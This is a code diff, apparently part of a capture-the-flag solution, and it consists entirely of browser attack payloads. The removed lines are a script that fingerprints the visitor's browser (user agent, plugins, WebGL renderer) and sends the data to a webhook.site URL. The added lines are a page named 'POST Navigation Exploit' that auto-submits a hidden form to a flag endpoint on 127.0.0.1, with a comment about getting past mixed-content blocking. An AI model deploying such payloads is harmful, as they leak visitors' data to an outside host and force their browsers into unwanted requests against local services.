@@ -1,19 +1,21 @@
-<script>
-const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427/';
-function report(title, data) {
-    fetch(webhook + '?title=' + encodeURIComponent(title) + '&data=' + encodeURIComponent(data))
-        .catch(e => {});
-}
-report('UserAgent', navigator.userAgent);
-report('AppVersion', navigator.appVersion);
-report('Vendor', navigator.vendor + ' / ' + navigator.vendorSub);
-report('Plugins', JSON.stringify([...navigator.plugins].map(p=>p.name)));
-report('WebGL', (() => {
-    try {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-    } catch(e) { return 'n/a: ' + e; }
-})());
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>POST Navigation Exploit</title>
+</head>
+<body>
+    <h2>Submitting to Flag Endpoint...</h2>
+    
+    <!-- target="_self" forces the main window to navigate to the local HTTP endpoint, bypassing mixed content iframe blocks -->
+    <form id="autoForm" action="http://127.0.0.1:31326/flag" method="POST">
+        <!-- Include potential required parameters just in case -->
+        <input type="hidden" name="submit" value="1">
+    </form>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('autoForm').submit();
+        }, 300);
+    </script>
+</body>
+</html>
